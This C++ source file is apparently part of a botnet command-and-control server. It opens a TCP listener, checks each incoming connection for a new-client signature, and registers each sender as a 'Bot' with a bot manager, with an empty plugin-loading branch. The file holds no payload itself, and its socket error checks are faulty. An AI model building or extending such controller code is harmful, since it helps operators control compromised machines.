#include "MainHandler.h"

MainHandler *MainHandler::Instance = nullptr;

bool MainHandler::isNewClientSignature(char *Payload) {
  return Variable::getInstance()->compareSignature(
      Variable::Signature::NEW_CLIENT, Payload);
}

void MainHandler::decideConnectType(SOCKET ClientHandle,
                                    SOCKADDR_IN ClientAddr) {
  Packet *InitPacket = new Packet(ClientHandle);
  if (InitPacket->receivePacket()) {
    switch (InitPacket->parseSignatureFromPayload()) {
    case Variable::Signature::NEW_CLIENT: {
      std::vector<std::string> Params = InitPacket->parseParams();
      Bot *NewBot =
          new Bot(ClientHandle, inet_ntoa(ClientAddr.sin_addr), Params.at(1));
      BotHandler::getInstance()->addBot(NewBot);
      NewBot->startLooping();
      break;
    }
    case Variable::Signature::LOAD_PLUGIN: {
      break;
    }
    }
  }

  delete InitPacket;
}

void MainHandler::acceptConnect(SOCKET ListenHandle) {
  SOCKADDR_IN ClientAddr = {};
  int ClientAddrSize = sizeof(ClientAddr);
  while (true) {
    SOCKET ClientHandle = NULL;
    ClientHandle =
        accept(ListenHandle, (SOCKADDR *)&ClientAddr, &ClientAddrSize);
    if (ClientHandle != NULL) {
      decideConnectType(ClientHandle, ClientAddr);
    } else if (ClientHandle == NULL) {
      continue;
    } else {
      continue;
    }
  }
}

MainHandler *MainHandler::getInstance() {
  if (Instance == NULL) {
    Instance = new MainHandler();
  }

  return Instance;
}

void MainHandler::startListenThread() {
  std::thread ListenThread(&MainHandler::startListen, this);
  ListenThread.detach();
}

void MainHandler::startListen() {
  WSADATA WsaData;
  WSAStartup(MAKEWORD(2, 2), &WsaData);

  SOCKET ListenHandle;
  ListenHandle = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  SOCKADDR_IN ListenAddr = {};
  ListenAddr.sin_family = AF_INET;
  ListenAddr.sin_port = htons(Variable::getInstance()->getPort());
  ListenAddr.sin_addr.s_addr = htonl(INADDR_ANY);

  bind(ListenHandle, (SOCKADDR *)&ListenAddr, sizeof(ListenAddr));
  listen(ListenHandle, SOMAXCONN);

  acceptConnect(ListenHandle);
}